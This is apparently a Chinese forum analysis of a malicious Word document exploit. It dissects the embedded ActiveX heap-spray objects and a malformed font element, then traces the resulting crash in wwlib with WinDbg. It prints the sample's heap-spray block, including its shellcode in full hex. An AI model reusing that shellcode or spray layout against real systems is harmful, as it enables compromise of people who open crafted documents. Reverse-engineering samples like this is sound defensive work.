
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>

<ax:ocx ax:classid="{00000000-0000-0000-0000-000000000001}" ax:persistence="persistStorage" r:id="rId1" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

在`Package~\word\activeX\_rels`目录下可以看到这些xml文件的对应规则，40个rels文件中的内容也都是一样的

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">

<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary" Target="activeX1.bin"/>

</Relationships>

<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">

<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary" Target="activeX1.bin"/>

</Relationships>
```

是将这些xm文件都指向`activeX1.bin`文件中，那么主要内容就是这个`activeX1.bin`文件了，我们看一下这个bin文件，发现里面有一块块重复的数据，大致是（A+B+C），其中

```
A:2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72（重复n组）

B:CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08（重复n组）

C:D0 10 94 72 8F 08 95 72 B0 DD 95 72 90 8C 88 08
01 02 00 00 40 00 00 00 45 C0 A4 72 89 2D 88 88
88 08 9B 9B 33 C9 64 8B 71 30 8B 76 0C 8B 76 1C
8B 46 08 8B 7E 20 8B 36 81 3F 6B 00 65 00 75 F0
8B F0 EB 57 60 8B DE 56 8B 73 3C 8B 74 1E 78 03
F3 56 8B 76 20 03 F3 33 C9 49 41 AD 03 C3 56 33
F6 0F BE 10 3A F2 74 08 C1 CE 07 03 F2 40 EB F1
39 75 00 5E 75 E4 5A 8B FB 8B 5A 24 03 DF 66 8B
0C 4B 8B 5A 1C 03 DF 8B 04 8B 03 C7 89 45 00 5E
83 C5 04 83 7D 00 00 75 AC 61 C3 8B FC C7 07 67
59 DE 1E C7 47 04 00 00 00 00 8B EF E8 93 FF FF
FF 6A 40 68 00 30 00 00 68 00 00 50 00 6A 00 FF
17 8B F8 8F 47 24 89 47 10 89 77 14 C7 07 8E 13
0A AC C7 47 04 C2 19 4B 01 C7 47 08 7D F0 A5 9A
C7 47 0C 00 00 00 00 8B EF E8 56 FF FF FF 33 F6
83 C6 04 6A 00 56 FF 17 3D 00 A0 00 00 7C F1 3D
00 00 20 00 7F EA 89 47 18 89 77 1C 33 DB 53 53
53 6A 02 53 FF 77 1C FF 57 04 83 F8 00 74 D1 33
DB 53 53 53 6A 04 50 FF 57 08 83 F8 00 74 C1 89
47 20 81 38 7B 5C 72 74 75 B6 05 00 00 01 00 81
38 FE FE FE FE 75 F3 40 80 38 FE 74 FA 83 38 FF
75 E8 83 C0 04 8B F0 FF 77 10 FF 77 18 FF 77 1C
FF 77 20 FF 77 14 8D BF 00 10 00 00 8B C7 B9 00
00 00 00 8B 16 81 F2 33 33 AD BC 89 17 83 C1 01
81 F9 50 01 00 00 74 08 83 C6 04 83 C7 04 EB E3
FF E0 CC CC
```

每块大小`0x1000`，共有512块，这就很明显了，是用于堆喷的，`C`是shellcode部分。我们记下这里的几个地址`72980b2e`、`729440cb`、`729440cb`、`088883ec`，看后面能不能遇到。关于shellcode部分，可以用[在线网站](https://bbs.kanxue.com/elink@4c0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6G2L8X3I4A6L8X3g2V1K9i4y4S2M7%4y4W2L8h3u0D9k6i4u0Q4x3X3g2U0L8$3#2Q4x3V1k6G2k6r3q4%4k6h3u0Q4x3V1j5)查看反汇编代码和流程。

再看一看第三个对象，

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<w:document xmlns:ve="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml">

<w:body >

<w:shapeDefaults >

<o:OLEObject >

<w:font w:name="LincerCharChar瑁 font锛歜atang"><o:idmap/>

</o:OLEObject>

</w:shapeDefaults>

</w:body>

</w:document>
```

存在乱码字符，我们还是看一下其二进制内容：

![](https://bbs.kanxue.com/upload/attach/201805/682107_794T3VT3M2N9HXV.jpg)

其乱码部分是`E8 A3 AC E0 A2 88`，与第二个对象中的几个地址好像都沾不上边。关于样本的分析就到这里，我们大致可以总结出：样本文件中有三个嵌入的对象，其中第一个对象用于绕过aslr(虽然可能并没有什么作用)，第二个对象是用来堆喷的，那么第三个对象想来应该就是结合堆喷实现漏洞利用的。我们在后面的分析调试中可以重点关注第三个对象相关的信息。

## 2 调试分析

![](https://bbs.kanxue.com/upload/attach/201805/682107_RZBJQ9AS23A2N4A.jpg)

我们用`windbg`附加`WINWORD.EXE`，然后打开`exp`，程序断在这里：

```
First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

eax=088888ec ebx=00000000 ecx=0aebe870 edx=00000004 esi=005845ac edi=0387d9dc

eip=6793a182 esp=00143748 ebp=001437b0 iopl=0         nv up ei pl nz na po nc

cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202

wwlib!DllGetLCID+0x2cc78c:

6793a182 8b08            mov     ecx,dword ptr [eax]  ds:002b:088888ec=????????
```

通过反汇编窗口可以看到崩溃处附近的代码：

```
6793a167 4a              dec     edx
6793a168 4a              dec     edx
6793a169 8bce            mov     ecx,esi
6793a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (674698b0)
6793a170 8b4044          mov     eax,dword ptr [eax+44h]
6793a173 8b4044          mov     eax,dword ptr [eax+44h]
6793a176 8b4f44          mov     ecx,dword ptr [edi+44h]
6793a179 894144          mov     dword ptr [ecx+44h],eax
6793a17c 8b4744          mov     eax,dword ptr [edi+44h]
6793a17f 8b4044          mov     eax,dword ptr [eax+44h]
6793a182 8b08            mov     ecx,dword ptr [eax]  ds:002b:088888ec=????????
6793a184 50              push    eax
6793a185 ff5104          call    dword ptr [ecx+4]
6793a188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (677e5f87)
6793a18d 83f802          cmp     eax,2
6793a190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6793a1a1)
6793a192 83c624          add     esi,24h
```

显然，`eax`的值在`call wwlib!DllGetClassObject+0x42d4 (674698b0)`被修改，我们在该处下断点跟踪看一下，重新加载样本

```
0:011>  bp wwlib!DllGetLCID+0x2cc78c-3*6-5(由于开启了aslr，所以使用相对地址，从崩溃处向上计算)

0:011> bl

 0 e 6793a16b     0001 (0001)  0:**** wwlib!DllGetLCID+0x2cc775

0:011>g
```

如期而断

```
Breakpoint 0 hit

eax=03601800 ebx=00000000 ecx=00424610 edx=00000004 esi=00424610 edi=036019dc

eip=6793a16b esp=0031366c ebp=003136d4 iopl=0         nv up ei pl nz na po nc

cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202

wwlib!DllGetLCID+0x2cc775:

6793a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (674698b0)
```

程序断下后，我们跟进这个call看一下，

![](https://bbs.kanxue.com/upload/attach/201805/682107_N838XW53KHP4AKF.jpg)

![](https://bbs.kanxue.com/upload/attach/201805/682107_DSWJNX5R9FFJVHK.jpg)

该处代码其实就是:

```
eax*[[ecx]+8]+[[ecx]+0Ch]+[ecx]，其中，edx=edx>poi(ecx)?eax:edx
```

很明显，这里是一个“查表”的操作，多次跟踪可知，`ecx`指向的地址中存的值是固定的。所以上面的式子也可以转换成：`eax*0x5c + 0x10 + [ecx]`，我们就可以通过这个式子去探探这个“表”里面具体是什么内容，
